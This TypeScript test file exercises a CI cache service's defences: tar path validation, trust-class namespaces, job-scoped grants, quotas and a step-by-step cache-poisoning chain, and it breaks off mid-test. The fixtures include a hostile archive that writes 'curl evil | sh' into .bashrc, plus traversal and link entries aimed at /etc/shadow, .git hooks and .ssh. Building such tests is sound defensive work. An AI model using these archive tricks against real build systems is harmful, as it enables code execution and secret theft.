import { beforeEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CacheGrants } from "../src/cache/grants";
import { jobCacheProvider } from "../src/cache/job";
import { CLASS_SHARE, readableNamespaces, refScopeFor } from "../src/cache/namespace";
import { createCacheService, type CacheService } from "../src/cache/service";
import { FsCacheStore } from "../src/cache/store";
import {
  ArchiveError,
  DEFAULT_RULES,
  DENIED_COMPONENTS,
  DENIED_FILES,
  DENIED_SEQUENCES,
  validateArchive,
  walkArchive,
} from "../src/cache/tar";
import {
  createOrg,
  createProject,
  createRun,
  type Db,
  getProjectCacheReleaseRestore,
  openDatabase,
  setProjectCacheReleaseRestore,
} from "../src/db";
import { startServer } from "../src/server";
import type { TrustClass } from "../src/trust";

// ---- tar helpers ----

function tarEntry(
  name: string,
  o: {
    type?: string;
    data?: string;
    link?: string;
    /** Header size field when it should differ from the data. */
    size?: number;
    magic?: "posix" | "gnu" | "v7";
    prefix?: string;
    mode?: string;
  } = {},
): Buffer {
  const data = Buffer.from(o.data ?? "");
  const h = Buffer.alloc(512);
  h.write(name, 0, 100);
  h.write(`${o.mode ?? "0000644"}\0`, 100);
  h.write("0000000\0", 108);
  h.write("0000000\0", 116);
  h.write(`${(o.size ?? data.length).toString(8).padStart(11, "0")}\0`, 124);
  h.write("00000000000\0", 136);
  h.write("        ", 148);
  h.write(o.type ?? "0", 156);
  if (o.link) h.write(o.link, 157, 100);
  if (o.magic === "gnu") h.write("ustar  \0", 257);
  else if (o.magic !== "v7") {
    h.write("ustar\0", 257);
    h.write("00", 263);
  }
  if (o.prefix !== undefined) h.write(o.prefix, 345, 155);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148);
  const pad = Buffer.alloc((512 - (data.length % 512)) % 512);
  return Buffer.concat([h, data, pad]);
}
/** A PAX extended header record: "<len> key=value\n", the length counting itself. */
const paxRecord = (k: string, v: string): string => {
  const body = ` ${k}=${v}\n`;
  let len = body.length + 1;
  while (String(len).length + body.length !== len) len = String(len).length + body.length;
  return `${len}${body}`;
};
const pax = (...records: [string, string][]): Buffer =>
  tarEntry("PaxHeader", { type: "x", data: records.map(([k, v]) => paxRecord(k, v)).join("") });
const tar = (...entries: Buffer[]): Buffer => Buffer.concat([...entries, Buffer.alloc(1024)]);
const good = tar(
  tarEntry("node_modules/a/index.js", { data: "x".repeat(700) }),
  tarEntry("node_modules/", { type: "5" }),
);

let dir: string;
beforeEach(() => void (dir = mkdtempSync(join(tmpdir(), "ls-cache-"))));

/**
 * Whether an archive is refused. An archive is also reported as "not allowed" here when entries at
 * denied paths were dropped from it: those tests ask "does the dangerous entry get through as is?",
 * and it does not. `walked` below tests the dropping itself.
 */
async function check(bytes: Buffer, name = "a.tar"): Promise<ArchiveError | null> {
  const f = join(dir, name);
  writeFileSync(f, bytes);
  try {
    const r = await validateArchive(f, DEFAULT_RULES);
    if (r.skipped > 0)
      return new ArchiveError(`path is not allowed in a cache: dropped ${r.skipped}`);
    return null;
  } catch (e) {
    if (e instanceof ArchiveError) return e;
    throw e;
  }
}

async function walked(bytes: Buffer, name = "w.tar") {
  const f = join(dir, name);
  writeFileSync(f, bytes);
  return validateArchive(f, DEFAULT_RULES);
}

describe("path-validated archives", () => {
  test("a normal archive passes, as tar, gzip and zstd", async () => {
    expect(await check(good)).toBeNull();
    expect(await check(Buffer.from(Bun.gzipSync(new Uint8Array(good))), "a.tgz")).toBeNull();
    expect(
      await check(Buffer.from(Bun.zstdCompressSync(new Uint8Array(good))), "a.tzst"),
    ).toBeNull();
  });

  test("traversal, absolute paths outside the allowed roots, and protected locations are refused", async () => {
    for (const [name, why] of [
      ["../../etc/passwd", /escapes/],
      ["a/../../b", /escapes/],
      ["/etc/cron.d/x", /allowed roots/],
      ["/usr/local/bin/node", /allowed roots/],
      [".git/hooks/pre-commit", /not allowed/],
      ["repo/.git/config", /not allowed/],
      [".github/workflows/ci.yml", /not allowed/],
      ["/home/runner/.bashrc", /not allowed/],
      ["home/runner/.ssh/authorized_keys", /not allowed/],
      [".longshore/jobs/x.yml", /not allowed/],
    ] as const) {
      const err = await check(tar(tarEntry(name, { data: "x" })));
      expect(err?.message, name).toMatch(why);
    }
    // Absolute paths under a cache root are what actions/cache writes for ~/.npm.
    expect(await check(tar(tarEntry("/home/runner/.npm/_cacache/x", { data: "x" })))).toBeNull();
  });

  test("links may not leave the tree, devices and fifos are refused", async () => {
    expect(
      (await check(tar(tarEntry("a/link", { type: "2", link: "../../../etc/shadow" }))))?.message,
    ).toMatch(/escapes/);
    expect(
      (await check(tar(tarEntry("a/link", { type: "2", link: "/etc/shadow" }))))?.message,
    ).toMatch(/allowed roots/);
    expect((await check(tar(tarEntry("a/link", { type: "1", link: "../../x" }))))?.message).toMatch(
      /escapes/,
    );
    expect(
      await check(tar(tarEntry("a/link", { type: "2", link: "../../.git/hooks/x" }))),
    ).not.toBeNull();
    expect((await check(tar(tarEntry("dev", { type: "3" }))))?.message).toMatch(/not allowed/);
    expect((await check(tar(tarEntry("fifo", { type: "6" }))))?.message).toMatch(/not allowed/);
    // A relative link that stays inside is normal (node_modules/.bin).
    expect(
      await check(tar(tarEntry("node_modules/.bin/x", { type: "2", link: "../x/cli.js" }))),
    ).toBeNull();
  });

  test("a PAX size cannot hide an entry: it is the data length, so the hidden header is walked", async () => {
    const hidden = Buffer.concat([tarEntry(".git/hooks/pre-commit", { data: "#!/bin/sh\nevil" })]);
    // Header says 1024 data bytes (a naive walker skips the whole hidden entry); PAX says 0, as
    // tar will read it, so the next header is the hook.
    const innocent = tarEntry("a.txt", { size: hidden.length, data: "" });
    const evil = tar(pax(["size", "0"]), innocent, hidden);
    expect((await check(evil))?.message).toMatch(/not allowed/);
    // Without the PAX size the same bytes are one big innocent file.
    expect(await check(tar(tarEntry("a.txt", { data: hidden.toString("latin1") })))).toBeNull();
    // A PAX size the header disagrees with is the PAX one, never the header's.
    const bigPax = tar(pax(["size", "5"]), tarEntry("b.txt", { size: 0, data: "hello" }));
    expect(await check(bigPax)).toBeNull();
  });

  test("unknown PAX keys, sparse files and PAX global headers are refused (fail closed)", async () => {
    for (const k of ["GNU.sparse.map", "GNU.sparse.size", "SCHILY.xattr.user.x", "comment"]) {
      expect((await check(tar(pax([k, "1"]), tarEntry("a", { data: "x" }))))?.message, k).toMatch(
        /not allowed/,
      );
    }
    expect(
      await check(
        tar(pax(["mtime", "1.5"], ["uid", "0"], ["uname", "x"]), tarEntry("a", { data: "x" })),
      ),
    ).toBeNull();
    expect((await check(tar(tarEntry("a", { type: "S", data: "x" }))))?.message).toMatch(
      /not allowed/,
    );
    expect(
      (await check(tar(tarEntry("g", { type: "g", data: paxRecord("path", ".git/x") }))))?.message,
    ).toMatch(/not allowed/);
    // The path from PAX and from a GNU long name are what is checked, not the header's name.
    expect(
      (await check(tar(pax(["path", ".git/hooks/x"]), tarEntry("innocent", { data: "x" }))))
        ?.message,
    ).toMatch(/not allowed/);
    expect(
      (
        await check(
          tar(
            tarEntry("././@LongLink", { type: "L", data: ".git/hooks/x\0" }),
            tarEntry("innocent", { data: "x" }),
          ),
        )
      )?.message,
    ).toMatch(/not allowed/);
  });

  test("the ustar prefix applies only for exact POSIX ustar; a GNU header's bytes are not a path", async () => {
    expect(
      (await check(tar(tarEntry("ok.txt", { prefix: ".git/hooks", data: "x" }))))?.message,
    ).toMatch(/not allowed/);
    // GNU format ("ustar  \0") puts other data there: tar does not read it as a prefix.
    expect(
      await check(tar(tarEntry("ok.txt", { magic: "gnu", prefix: ".git/hooks", data: "x" }))),
    ).toBeNull();
    // V7 headers (no magic) have no prefix either.
    expect(
      await check(tar(tarEntry("ok.txt", { magic: "v7", prefix: ".git/hooks", data: "x" }))),
    ).toBeNull();
  });

  test("no entry may run through a link the archive made; bare denied directories are refused as targets", async () => {
    const through = tar(
      tarEntry("cache/dir", { type: "2", link: "../other" }),
      tarEntry("cache/dir/evil", { data: "x" }),
    );
    expect((await check(through))?.message).toMatch(/runs through a link/);
    // The link path itself reused by a later entry is refused too.
    expect(
      (await check(tar(tarEntry("l", { type: "2", link: "t" }), tarEntry("l", { data: "x" }))))
        ?.message,
    ).toMatch(/runs through a link/);
    // Hardlinks are links too.
    expect(
      (
        await check(
          tar(tarEntry("h", { type: "1", link: "file" }), tarEntry("h/evil", { data: "x" })),
        )
      )?.message,
    ).toMatch(/runs through a link/);
    for (const link of [".git", "../.git", ".github", "x/.ssh", ".gnupg", ".longshore"]) {
      expect(
        (await check(tar(tarEntry(`d/${link.replace(/[./]/g, "")}l`, { type: "2", link }))))
          ?.message,
        link,
      ).toMatch(/not allowed|escapes/);
    }
    expect(
      (await check(tar(tarEntry("abs", { type: "2", link: "/home/runner/.ssh" }))))?.message,
    ).toMatch(/not allowed/);
    // A .git that is a file, not a directory.
    expect((await check(tar(tarEntry("repo/.git", { data: "gitdir: /x" }))))?.message).toMatch(
      /not allowed/,
    );
    // Any entry with a .git component is refused, a directory entry included.
    expect((await check(tar(tarEntry("repo/.git/", { type: "5" }))))?.message).toMatch(
      /not allowed/,
    );
  });

  test("hardlink targets resolve from the archive root, not the entry's directory", async () => {
    // From the root this is just "node_modules/a": fine, whatever directory the link is in.
    expect(
      await check(
        tar(
          tarEntry("node_modules/a", { data: "x" }),
          tarEntry("deep/er/dir/h", { type: "1", link: "node_modules/a" }),
        ),
      ),
    ).toBeNull();
    // Traversal in the target is refused outright, and so is a denied target.
    expect((await check(tar(tarEntry("a/h", { type: "1", link: "../b" }))))?.message).toMatch(
      /escapes/,
    );
    expect(
      (await check(tar(tarEntry("a/h", { type: "1", link: ".git/config" }))))?.message,
    ).toMatch(/not allowed/);
    // A target that runs through an earlier link is refused.
    expect(
      (
        await check(
          tar(
            tarEntry("lnk", { type: "2", link: "real" }),
            tarEntry("h", { type: "1", link: "lnk/secret" }),
          ),
        )
      )?.message,
    ).toMatch(/runs through a link/);
  });

  test("links and directories that carry data are refused", async () => {
    expect(
      (await check(tar(tarEntry("l", { type: "2", link: "t", size: 512, data: "x".repeat(512) }))))
        ?.message,
    ).toMatch(/with data/);
    expect((await check(tar(pax(["size", "9"]), tarEntry("d/", { type: "5" }))))?.message).toMatch(
      /with data/,
    );
  });

  test("garbage, an empty archive and a bomb are refused", async () => {
    expect(await check(Buffer.alloc(2048, 7))).not.toBeNull();
    expect((await check(Buffer.alloc(1024)))?.message).toMatch(/no entries/);
    const f = join(dir, "bomb.tar");
    writeFileSync(f, tar(tarEntry("big", { data: "x" })));
    await expect(validateArchive(f, { ...DEFAULT_RULES, maxEntries: 0 })).rejects.toThrow(
      /too many/,
    );
    await expect(validateArchive(f, { ...DEFAULT_RULES, maxUncompressed: 0 })).rejects.toThrow(
      /too large/,
    );
  });

  test("a long name in a PAX header is checked as the real path", async () => {
    const body = " path=../../evil\n";
    let len = body.length + 1;
    while (String(len).length + body.length !== len) len = String(len).length + body.length;
    const pax = tarEntry("PaxHeader", { type: "x", data: `${len}${body}` });
    const err = await check(tar(pax, tarEntry("harmless.txt", { data: "x" })));
    expect(err?.message).toMatch(/escapes/);
  });
});

// ---- namespaces ----

describe("namespaces", () => {
  const own = (klass: TrustClass, refScope = "-") => ({
    orgId: "o",
    projectId: "p",
    klass,
    refScope,
  });
  test("a job reads its own namespace and never a lower class", () => {
    const classes = ["release", "protected", "trusted_pr", "untrusted_pr"] as TrustClass[];
    const order = (k: string) => classes.indexOf(k as TrustClass);
    for (const k of classes) {
      for (const restore of [false, true]) {
        for (const ns of readableNamespaces(own(k, "pr:1"), { releaseRestore: restore })) {
          expect(order(ns.klass)).toBeLessThanOrEqual(order(k));
        }
      }
    }
    expect(
      readableNamespaces(own("untrusted_pr", "pr:1"), { releaseRestore: true }).map((n) => n.klass),
    ).toEqual(["untrusted_pr"]);
    expect(
      readableNamespaces(own("trusted_pr", "pr:2"), { releaseRestore: false }).map(
        (n) => `${n.klass}/${n.refScope}`,
      ),
    ).toEqual(["trusted_pr/pr:2", "protected/-"]);
    expect(
      readableNamespaces(own("protected"), { releaseRestore: false }).map((n) => n.klass),
    ).toEqual(["protected"]);
  });

  test("release restores nothing by default, and only release-written caches when the project opts in", () => {
    expect(readableNamespaces(own("release"), { releaseRestore: false })).toEqual([]);
    expect(readableNamespaces(own("release"), { releaseRestore: true })).toEqual([own("release")]);
  });

  test("ref scope: one per pull request for PR classes, one per class otherwise", () => {
    expect(
      refScopeFor("untrusted_pr", { event: "pull_request", ref: "refs/pull/7/merge", prNumber: 7 }),
    ).toBe("pr:7");
    expect(
      refScopeFor("trusted_pr", {
        event: "pull_request",
        ref: "refs/pull/8/merge",
        prNumber: null,
      }),
    ).toBe("pr:8");
    expect(
      refScopeFor("protected", { event: "push", ref: "refs/heads/main", prNumber: null }),
    ).toBe("-");
    expect(refScopeFor("release", { event: "push", ref: "refs/tags/v1", prNumber: null })).toBe(
      "-",
    );
    expect(Object.values(CLASS_SHARE).reduce((a, b) => a + b, 0)).toBeLessThanOrEqual(1);
  });
});

// ---- grants ----

describe("grants", () => {
  const ns = { orgId: "o", projectId: "p", klass: "protected", refScope: "-" };
  test("a grant works while its job runs, and not after it ends or expires", () => {
    let t = 1000;
    const g = new CacheGrants({ now: () => t, maxMs: 5000 });
    const token = g.issue({ attemptId: "a1", own: ns, releaseRestore: false });
    expect(g.verify(token)?.attemptId).toBe("a1");
    expect(g.verify(`${token}x`)).toBeUndefined();
    expect(g.verify("short")).toBeUndefined();
    g.revoke("a1");
    expect(g.verify(token)).toBeUndefined();
    const t2 = g.issue({ attemptId: "a2", own: ns, releaseRestore: false });
    t += 6000;
    expect(g.verify(t2)).toBeUndefined();
    expect(g.size).toBe(0);
    // A new grant for the same attempt replaces the old one.
    const first = g.issue({ attemptId: "a3", own: ns, releaseRestore: false });
    const second = g.issue({ attemptId: "a3", own: ns, releaseRestore: false });
    expect(g.verify(first)).toBeUndefined();
    expect(g.verify(second)).toBeDefined();
  });
});

// ---- the service, over the real HTTP protocol ----

type World = {
  db: Db;
  service: CacheService;
  orgId: string;
  projectId: string;
  server: ReturnType<typeof startServer>;
  base: string;
};

async function world(
  o: {
    quota?: number;
    maxEntry?: number;
    isActive?: (a: string) => boolean;
    now?: () => number;
    onNotice?: (message: string) => void;
  } = {},
): Promise<World> {
  const db = openDatabase(":memory:");
  const org = await createOrg(db, { slug: "acme", name: "Acme" });
  const project = await createProject(db, { orgId: org.id }, { slug: "app", name: "App" });
  const grants = new CacheGrants();
  let port = 0;
  const service = createCacheService({
    db,
    store: new FsCacheStore(join(dir, "blobs")),
    grants,
    orgQuotaBytes: o.quota ?? 10 * 1024 ** 2,
    maxEntryBytes: o.maxEntry ?? 4 * 1024 ** 2,
    baseUrl: "http://127.0.0.1:0",
    ...(o.now ? { now: o.now } : {}),
    ...(o.onNotice ? { onNotice: (_g: unknown, m: string) => o.onNotice!(m) } : {}),
    ...(o.isActive ? { isActive: async (g) => o.isActive!(g.attemptId) } : {}),
  });
  const server = startServer({ port: 0, host: "127.0.0.1", db, cache: service });
  port = server.port!;
  void port;
  return {
    db,
    service,
    orgId: org.id,
    projectId: project.id,
    server,
    base: `http://127.0.0.1:${server.port}`,
  };
}

const nsOf = (w: World, klass: TrustClass, refScope = "-") => ({
  orgId: w.orgId,
  projectId: w.projectId,
  klass,
  refScope,
});
const grant = (
  w: World,
  attemptId: string,
  klass: TrustClass,
  refScope = "-",
  releaseRestore = false,
) => w.service.grants.issue({ attemptId, own: nsOf(w, klass, refScope), releaseRestore });

/** An actions/cache v1 client: reserve, upload in chunks with Content-Range, commit, find, download. */
function client(w: World, token: string) {
  const api = `${w.base}/_cache/${token}/_apis/artifactcache`;
  return {
    async save(key: string, version: string, archive: Buffer, chunk = 600) {
      const r = await fetch(`${api}/caches`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ key, version, cacheSize: archive.length }),
      });
      if (r.status !== 200) return { status: r.status, body: await r.text() };
      const { cacheId } = (await r.json()) as { cacheId: number };
      for (let off = 0; off < archive.length; off += chunk) {
        const part = archive.subarray(off, off + chunk);
        const p = await fetch(`${api}/caches/${cacheId}`, {
          method: "PATCH",
          headers: { "content-range": `bytes ${off}-${off + part.length - 1}/*` },
          body: part,
        });
        if (p.status !== 200) return { status: p.status, body: await p.text(), cacheId };
      }
      const c = await fetch(`${api}/caches/${cacheId}`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ size: archive.length }),
      });
      return { status: c.status, body: await c.text(), cacheId };
    },
    async restore(keys: string[], version: string): Promise<{ key: string; bytes: Buffer } | null> {
      const r = await fetch(
        `${api}/cache?keys=${encodeURIComponent(keys.join(","))}&version=${version}`,
      );
      if (r.status === 204) return null;
      expect(r.status).toBe(200);
      const hit = (await r.json()) as { archiveLocation: string; cacheKey: string };
      const d = await fetch(hit.archiveLocation.replace("http://127.0.0.1:0", w.base));
      expect(d.status).toBe(200);
      return { key: hit.cacheKey, bytes: Buffer.from(await d.arrayBuffer()) };
    },
    api,
  };
}

describe("cache service over HTTP", () => {
  test("save and restore round-trip, with restore keys and a ranged download", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const saved = await c.save("npm-Linux-abc123", "v1", good);
      expect(saved.status).toBe(200);
      expect((await c.restore(["npm-linux-abc123"], "v1"))?.bytes.equals(good)).toBe(true);
      // restore-keys: a prefix finds the newest entry; a wrong version finds nothing.
      expect((await c.restore(["nope", "npm-linux-"], "v1"))?.key).toBe("npm-linux-abc123");
      expect(await c.restore(["npm-linux-abc123"], "other")).toBeNull();
      // Reserving the same key and version again is a conflict (409), as actions/cache expects.
      expect((await c.save("npm-linux-abc123", "v1", good)).status).toBe(409);
      // A range read, as the v4 client's parallel download does.
      const hit = (await (
        await fetch(`${c.api}/cache?keys=npm-linux-abc123&version=v1`)
      ).json()) as { archiveLocation: string };
      const ranged = await fetch(hit.archiveLocation.replace("http://127.0.0.1:0", w.base), {
        headers: { range: "bytes=0-9" },
      });
      expect(ranged.status).toBe(206);
      expect(Buffer.from(await ranged.arrayBuffer()).equals(good.subarray(0, 10))).toBe(true);
    } finally {
      await w.server.stop(true);
    }
  });

  test("an unknown, revoked or ended-job token gets the same 401, and the bare path gets nothing", async () => {
    let running = true;
    const w = await world({ isActive: () => running });
    try {
      const token = grant(w, "a1", "protected");
      const url = `${w.base}/_cache/${token}/_apis/artifactcache/cache?keys=k&version=v`;
      expect((await fetch(url)).status).toBe(204);
      running = false; // the attempt is no longer running
      expect((await fetch(url)).status).toBe(401);
      running = true;
      expect((await fetch(url)).status).toBe(401); // and the grant was revoked for good
      expect(
        (
          await fetch(
            `${w.base}/_cache/${"x".repeat(32)}/_apis/artifactcache/cache?keys=k&version=v`,
          )
        ).status,
      ).toBe(401);
      const t2 = grant(w, "a2", "protected");
      w.service.grants.revoke("a2");
      expect(
        (await fetch(`${w.base}/_cache/${t2}/_apis/artifactcache/cache?keys=k&version=v`)).status,
      ).toBe(401);
      expect((await fetch(`${w.base}/_cache/`)).status).toBe(401);
    } finally {
      await w.server.stop(true);
    }
  });

  test("an archive that fails validation is never restorable, and its entry is dropped", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      const evil = tar(tarEntry("../../home/runner/.bashrc", { data: "curl evil | sh" }));
      const r = await c.save("k", "v", evil);
      expect(r.status).toBe(400);
      expect(r.body).toContain("archive refused");
      expect(await c.restore(["k"], "v")).toBeNull();
      // Uploaded bytes that do not match the declared size are refused too.
      const reserve = await fetch(`${c.api}/caches`, {
        method: "POST",
        body: JSON.stringify({ key: "k2", version: "v", cacheSize: 5 }),
      });
      const { cacheId } = (await reserve.json()) as { cacheId: number };
      await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-9/*" },
        body: good.subarray(0, 10),
      });
      const commit = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "POST",
        body: JSON.stringify({ size: 99 }),
      });
      expect(commit.status).toBe(400);
    } finally {
      await w.server.stop(true);
    }
  });

  test("entries over the limit are refused; so is writing to an entry that is not yours", async () => {
    const w = await world({ maxEntry: 2000 });
    try {
      const c = client(w, grant(w, "a1", "untrusted_pr", "pr:1"));
      const big = tar(tarEntry("big", { data: "x".repeat(4000) }));
      expect((await c.save("k", "v", big)).status).toBe(413);
      // Another job's reserved entry cannot be written or committed by this job.
      const other = client(w, grant(w, "a2", "untrusted_pr", "pr:2"));
      const r = await fetch(`${other.api}/caches`, {
        method: "POST",
        body: JSON.stringify({ key: "mine", version: "v", cacheSize: 10 }),
      });
      const { cacheId } = (await r.json()) as { cacheId: number };
      const patch = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-3/*" },
        body: "xxxx",
      });
      expect(patch.status).toBe(400);
      const commit = await fetch(`${c.api}/caches/${cacheId}`, { method: "POST", body: "{}" });
      expect(commit.status).toBe(400);
    } finally {
      await w.server.stop(true);
    }
  });
});

// ---- the cache-poisoning chain ----

describe("the published cache-poisoning chain fails at every step", () => {
  test("untrusted write, privileged restore, eviction flooding, path abuse, credential reuse, release restore", async () => {
    const w = await world({ quota: 40_000, maxEntry: 30_000 });
    try {
      const key = "npm-linux-lockhash"; // a predictable key a privileged workflow also uses
      const protectedJob = client(w, grant(w, "main-1", "protected"));
      const legit = tar(tarEntry("node_modules/legit/index.js", { data: "legit build output" }));
      expect((await protectedJob.save(key, "v1", legit)).status).toBe(200);

      // Step 1. An attacker's pull request job writes a malicious cache under the same key. It can
      // only write its own namespace: the namespace is not a parameter, and the grant fixes it.
      const attacker = client(w, grant(w, "pr-1", "untrusted_pr", "pr:99"));
      const poison = tar(tarEntry("node_modules/legit/index.js", { data: "steal secrets" }));
      expect((await attacker.save(key, "v1", poison)).status).toBe(200);
      // (It exists, but in the untrusted namespace.)

      // Step 2. The privileged workflow restores: it gets its own entry, never the poisoned one.
      const next = client(w, grant(w, "main-2", "protected"));
      expect((await next.restore([key], "v1"))?.bytes.equals(legit)).toBe(true);
      expect((await next.restore([key], "v1"))?.bytes.equals(poison)).toBe(false);
      // A trusted PR also reads protected (read up), not the untrusted PR's.
      const trusted = client(w, grant(w, "pr-2", "trusted_pr", "pr:5"));
      expect((await trusted.restore([key], "v1"))?.bytes.equals(legit)).toBe(true);
      // The attacker's own restore sees only what it wrote, never the protected entry.
      expect((await attacker.restore([key], "v1"))?.bytes.equals(poison)).toBe(true);

      // Step 3. The attacker names the protected entry's id directly: not readable from its grant.
      const hit = (await (await fetch(`${next.api}/cache?keys=${key}&version=v1`)).json()) as {
        archiveLocation: string;
      };
      const protectedId = hit.archiveLocation.split("/").at(-1);
      expect((await fetch(`${attacker.api}/artifacts/${protectedId}`)).status).toBe(404);
      // ... nor writable.
      const overwrite = await fetch(`${attacker.api}/caches/${protectedId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-3/*" },
        body: "evil",
      });
      expect(overwrite.status).toBe(400);

      // Step 4. Eviction flooding: fill the untrusted share, then keep going. Only the attacker's
      // own class is evicted; the protected entry survives and still restores.
      for (let i = 0; i < 12; i++) {
        const filler = tar(tarEntry(`f${i}`, { data: "y".repeat(2500) }));
        await attacker.save(`flood-${i}`, "v1", filler);
      }
      expect((await next.restore([key], "v1"))?.bytes.equals(legit)).toBe(true);
      // The flood is bounded by the class share: not everything it wrote is still there.
      const kept = (
        await Promise.all(
          Array.from({ length: 12 }, (_, i) => attacker.restore([`flood-${i}`], "v1")),
        )
      ).filter(Boolean);
      expect(kept.length).toBeLessThan(12);

      // Step 5. A hostile archive (a startup file, a path out of the tree) is refused at commit.
      const rc = tar(tarEntry("/home/runner/.bashrc", { data: "curl evil | sh" }));
      expect((await attacker.save("rc", "v1", rc)).status).toBe(400);

      // Step 6. The credential dies with the job.
      w.service.grants.revoke("pr-1");
      expect((await fetch(`${attacker.api}/cache?keys=${key}&version=v1`)).status).toBe(401);

      // Step 7. A release job restores nothing by default, even from release-written caches...
      const rel = client(w, grant(w, "rel-1", "release"));
      expect((await rel.save("rel-cache", "v1", legit)).status).toBe(200);
      const rel2 = client(w, grant(w, "rel-2", "release"));
      expect(await rel2.restore(["rel-cache"], "v1")).toBeNull();
      expect(await rel2.restore([key], "v1")).toBeNull(); // protected's cache is not offered either
      // ...and with the project's opt-in, only release-written ones.
      const rel3 = client(w, grant(w, "rel-3", "release", "-", true));
      expect((await rel3.restore(["rel-cache"], "v1"))?.bytes.equals(legit)).toBe(true);
      expect(await rel3.restore([key], "v1")).toBeNull();
    } finally {
      await w.server.stop(true);
    }
  });
});

// ---- quota ----

describe("quota", () => {
  test("a class that is over its share evicts its own least recently used entries, and is refused when it cannot fit", async () => {
    // A clock that moves on every read, so least-recently-used order is exact.
    let clock = 1_000_000;
    const w = await world({ quota: 100_000, maxEntry: 50_000, now: () => ++clock });
    try {
      // untrusted_pr share = 20% of 100k = 20k.
      const c = client(w, grant(w, "pr", "untrusted_pr", "pr:1"));
      const blob = (n: string) => tar(tarEntry(n, { data: "z".repeat(5000) }));
      for (const n of ["a", "b", "c"]) expect((await c.save(n, "v", blob(n))).status).toBe(200);
      // Touch `a` so `b` is the least recently used.
      await c.restore(["a"], "v");
      expect((await c.save("d", "v", blob("d"))).status).toBe(200);
      expect((await c.save("e", "v", blob("e"))).status).toBe(200);
      expect(await c.restore(["b"], "v")).toBeNull();
      expect((await c.restore(["a"], "v"))?.key).toBe("a");
      // An entry bigger than the whole class share is refused, and removes nothing it should keep.
      const huge = tar(tarEntry("huge", { data: "q".repeat(30_000) }));
      expect((await c.save("huge", "v", huge)).status).toBe(413);
      expect((await c.restore(["a"], "v"))?.key).toBe("a");
    } finally {
      await w.server.stop(true);
    }
  });
});

// ---- giving a job its cache ----

describe("job cache provider", () => {
  test("only a sandbox with a network path gets one; a local run never does; release is opt-in per project", async () => {
    const w = await world();
    try {
      const provider = jobCacheProvider(w.db, w.service);
      const run = await createRun(
        w.db,
        { orgId: w.orgId, projectId: w.projectId },
        { workflowPath: "w.yml", event: "push", ref: "refs/heads/main", sha: "a".repeat(40) },
      );
      const req = (egress: "none" | "open", klass: TrustClass = "protected", local = false) => ({
        run: { ...run, local },
        attemptId: "att-1",
        scope: { orgId: w.orgId, projectId: w.projectId },
        klass,
        egress,
      });
      expect(await provider(req("none"))).toBeUndefined();
      expect(await provider(req("open", "protected", true))).toBeUndefined();
      const g = await provider(req("open"));
      expect(g?.url).toMatch(/^http:\/\/127\.0\.0\.1:0\/_cache\/[A-Za-z0-9_-]{20,}\/$/);
      const token = g!.url.split("/").at(-2)!;
      expect(w.service.grants.verify(token)).toBeDefined();
      g!.release();
      expect(w.service.grants.verify(token)).toBeUndefined();
      // The release opt-in is read from the project.
      expect(
        await getProjectCacheReleaseRestore(w.db, { orgId: w.orgId, projectId: w.projectId }),
      ).toBe(false);
      await setProjectCacheReleaseRestore(w.db, { orgId: w.orgId, projectId: w.projectId }, true);
      const rg = await provider(req("open", "release"));
      expect(w.service.grants.verify(rg!.url.split("/").at(-2)!)?.releaseRestore).toBe(true);
    } finally {
      await w.server.stop(true);
    }
  });
});

describe("policy CLI", () => {
  test("cache-release-restore is off by default, set per project from the CLI and audited", async () => {
    const { setCacheReleaseRestorePolicy } = await import("../src/ops/policy-cli");
    const { listAudit } = await import("../src/db");
    const db = openDatabase(":memory:");
    const org = await createOrg(db, { slug: "acme", name: "Acme" });
    const project = await createProject(db, { orgId: org.id }, { slug: "app", name: "App" });
    const scope = { orgId: org.id, projectId: project.id };
    expect(await getProjectCacheReleaseRestore(db, scope)).toBe(false);
    expect(await setCacheReleaseRestorePolicy(db, "acme", undefined, "on")).toEqual([
      { project: "app", from: false, to: true },
    ]);
    expect(await getProjectCacheReleaseRestore(db, scope)).toBe(true);
    await expect(setCacheReleaseRestorePolicy(db, "acme", "app", "maybe")).rejects.toThrow(
      /on or off/,
    );
    expect((await listAudit(db, { orgId: org.id })).some((r) => r.op === "policy_set")).toBe(true);
    await setCacheReleaseRestorePolicy(db, "acme", "app", "off");
    expect(await getProjectCacheReleaseRestore(db, scope)).toBe(false);
  });
});

void createHash;
void rmSync;

describe("cache service hardening", () => {
  const reserve = (c: { api: string }, body: unknown) =>
    fetch(`${c.api}/caches`, { method: "POST", body: JSON.stringify(body) });

  test("a reservation needs a positive integer size, and an upload may not exceed it", async () => {
    const w = await world();
    try {
      const c = client(w, grant(w, "a1", "protected"));
      for (const cacheSize of [0, -1, 1.5, "10", null, undefined, Number.MAX_SAFE_INTEGER + 2]) {
        const r = await reserve(c, { key: "k", version: "v", cacheSize });
        expect(r.status, String(cacheSize)).toBe(
          cacheSize === Number.MAX_SAFE_INTEGER + 2 ? 400 : 400,
        );
      }
      const r = await reserve(c, { key: "k", version: "v", cacheSize: 100 });
      const { cacheId } = (await r.json()) as { cacheId: number };
      const over = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-199/*" },
        body: "x".repeat(200),
      });
      expect(over.status).toBe(413);
      // Writing at an offset that ends past the reservation is refused too.
      const far = await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 99-100/*" },
        body: "xx",
      });
      expect(far.status).toBe(413);
      // Uploading less than reserved fails the commit: what was charged is what exists.
      await fetch(`${c.api}/caches/${cacheId}`, {
        method: "PATCH",
        headers: { "content-range": "bytes 0-9/*" },
        body: good.subarray(0, 10),
      });
